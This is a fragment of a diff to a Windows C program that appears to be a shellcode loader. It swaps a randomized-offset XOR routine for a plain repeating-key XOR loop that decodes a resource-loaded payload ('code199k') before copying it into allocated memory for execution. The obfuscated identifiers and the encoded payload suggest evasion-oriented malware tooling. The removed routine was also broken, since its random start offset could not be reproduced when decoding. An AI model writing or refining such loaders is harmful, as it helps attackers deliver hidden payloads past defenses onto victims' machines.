@@ -9,16 +9,6 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void dynamic_xor(char* data, DWORD dataLen, char* key, DWORD keyLen) {
-    // Randomize the starting point for the XOR operation
-    DWORD startPos = rand() % keyLen;
-
-    for (DWORD i = 0; i < dataLen; i++) {
-        // Apply XOR using a dynamically changing key position
-        data[i] ^= key[(startPos + i) % keyLen];  // Modulo to stay within key bounds
-    }
-}
-
 
 void its_load_re(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
@@ -80,13 +70,10 @@ int main() {
 
 
     
-    //for (DWORD i = 0; i < code199kLen; i++) {
-        //code199k[i] ^= ke[i % keLen];
-    //}
-    srand((unsigned int)time(0));
-
-    // Dynamically XOR the payload with the key
-    dynamic_xor(code199k, code199kLen, ke, keLen);
+    for (DWORD i = 0; i < code199kLen; i++) {
+        code199k[i] ^= ke[i % keLen];
+    }
+   
     
     memcpy(lpBase, code199k, code199kLen);
 
